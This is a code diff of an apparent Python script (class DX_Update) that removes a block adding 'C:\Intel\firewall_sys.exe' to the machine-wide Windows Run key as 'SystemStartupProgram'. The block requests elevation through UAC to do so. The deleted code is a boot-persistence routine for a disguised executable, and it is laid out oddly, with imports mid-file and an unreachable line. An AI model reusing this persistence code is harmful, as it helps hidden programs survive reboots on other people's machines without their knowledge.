@@ -210,101 +210,6 @@ class DX_Update(object):
 
 #####################################################################  Add a program on startup ############################################################################
 
-"""
-Add (or remove) a program from the machine-wide Windows Run key.
-
-Equivalent to:
-    Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
-                     -Name $ProgramName -Value $ProgramPath
-
-Requires Administrator privileges (writes to HKLM).
-"""
-
-import ctypes
-import sys
-import winreg
-
-
-RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
-
-
-def is_admin() -> bool:
-    """True if the current process is elevated."""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    except Exception:
-        return False
-
-
-def relaunch_elevated() -> None:
-    """Re-run this script via UAC and exit the current process."""
-    params = " ".join(f'"{a}"' for a in sys.argv)
-    ctypes.windll.shell32.ShellExecuteW(
-        None, "runas", sys.executable, params, None, 1
-    )
-    sys.exit(0)
-
-
-def add_to_run_key(
-    program_path: str,
-    program_name: str,
-    hive: int = winreg.HKEY_LOCAL_MACHINE,
-) -> None:
-    """Create or overwrite a Run entry. HKLM = all users, HKCU = current user."""
-    with winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
-        winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, program_path)
-
-
-def remove_from_run_key(
-    program_name: str,
-    hive: int = winreg.HKEY_LOCAL_MACHINE,
-) -> bool:
-    """Delete a Run entry. Returns True if it existed, False otherwise."""
-    try:
-        with winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.DeleteValue(key, program_name)
-        return True
-    except FileNotFoundError:
-        return False
-
-
-def list_run_entries(hive: int = winreg.HKEY_LOCAL_MACHINE) -> dict:
-    """Dump every entry in the Run key (name -> command)."""
-    entries = {}
-    with winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_READ) as key:
-        i = 0
-        while True:
-            try:
-                name, value, _ = winreg.EnumValue(key, i)
-                entries[name] = value
-                i += 1
-            except OSError:
-                break
-    return entries
-
-
-def main() -> int:
-    program_path = r"C:\Intel\firewall_sys.exe"
-    program_name = "SystemStartupProgram"
-
-    if not is_admin():
-        print("Not elevated — requesting Administrator privileges via UAC...")
-        relaunch_elevated()          # never returns
-        # If you'd rather just fail instead of prompting, use:
-        # print("This script requires Administrator privileges", file=sys.stderr)
-        # return 1
-
-    try:
-        add_to_run_key(program_path, program_name)
-    except PermissionError:
-        print("Access denied — are you actually elevated?", file=sys.stderr)
-        return 1
-    except OSError as e:
-        print(f"Registry write failed: {e}", file=sys.stderr)
-        return 1
-
-    print("Program added to system-wide startup!")
-    return 0
 
 
 
@@ -316,9 +221,7 @@ def main() -> int:
 
 
 
-if __name__ == "__main__":
-    sys.exit(main())
-    DX_Update().main()
+DX_Update().main()
 
 
 
